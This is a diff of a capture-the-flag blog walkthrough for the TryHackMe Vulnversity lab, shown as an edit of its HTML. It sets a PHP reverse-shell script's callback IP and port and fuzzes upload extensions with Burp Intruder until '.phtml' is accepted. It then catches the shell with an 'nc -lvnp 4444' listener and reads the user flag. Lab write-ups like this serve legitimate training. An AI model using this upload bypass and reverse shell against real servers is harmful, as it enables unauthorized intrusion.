@@ -265,22 +265,28 @@ $ip = '127.0.0.1';  // CHANGE THIS INTO YOUR VPN TUNNEL IP
 <br>
 $port = 1234;       // CHANGE THIS   
 <br>
-3.Next you need to upload this script to target web . while uploding you may found this error <img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot 2020-08-28 18^%19^%20"> 
+3.Next you need to upload this script to target web . while uploading you may found this error <img src="https://atomloop.github.io/image/tryhackme/vulnversity/1.png"> 
 <br>
-this means that the format of the script we uploded was not accepted by our target .so you need to find which format is supported by our target to upload reverce-shell-script . you can do it manually or you can use  burpsuit.
-on berpsuit intercept the form . <img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot_2020-08-28_18-00-04">
+this means that the format of the script we uploaded was not accepted by our target. so you need to find which format is supported by our target to upload reverce-shell-script . you can do it manually or you can use  burpsuit.
+on berpsuit intercept the form . <img src="https://atomloop.github.io/image/tryhackme/vulnversity/2.png">
 <br>
-<h4> uploding Reverse-shell</h4>
-while try to upload the reverse-shell script we may find this error 
-<img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot 2020-08-28 18^%19^%20.png">
-
-<p>on burp suite . intercept the form that you are sending </p>
+you will find find the reversh-shell.php under filename option. Right click  the window and select the option send to intruder .  noe you are in intruder window . select the  position tab add position for dictnoary attack using $$ symbul . <img src="https://atomloop.github.io/image/tryhackme/vulnversity/3.png"> if you find any dificulty please learn how intruder <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/using"> works </a> <br>
+After that under the payload option select the most common extension or you can add extension as per your guess . then you can lanch attack by selecting <b>start attack</b> option.  <img src="https://atomloop.github.io/image/tryhackme/vulnversity/4.png">here i mensioned few extension which is most common . you can find  values and its diffrence under length tab  <img src="https://atomloop.github.io/image/tryhackme/vulnversity/5.png"> a value of .phtml is differ from other extensions . may be this is the extension our target webserver support . lets try to upload reverse-shell uousing this format . but before that we need to get ready for catch the reverse-shell 
 
 <h2>Get Ready to catch the reverse shell</h2>
 
-Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
+Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (4444 in this example):
 
-$ nc -v -n -l -p 1234
+$ nc -lvnp 4444
+
+
+<pre><code class="language-bash">atom@ubuntu:~/Desktop$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+</code></pre></p>
+
+<h4>uploding Reverse-shell</h4>
+
+while uploding reverse-shell , you can find like this <img src="https://atomloop.github.io/image/tryhackme/vulnversity/6.png"> This means your payload has successfully uploaded on targer server . you need to execute the code by accessing it . you can access it under this directory http://yourip/internal/upload/reversh-shell.php
 
 <pre><code class="language-bash">atom@ubuntu:~/Desktop$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
@@ -298,8 +304,11 @@ $ ls
 user.txt
 $ cat user.txt  
 8bd7##########################
-
 </code></pre></p>
+
+
+
+
 <h3 style="color: blue">[Task 5] Privilege Escalation </h3>
 
 
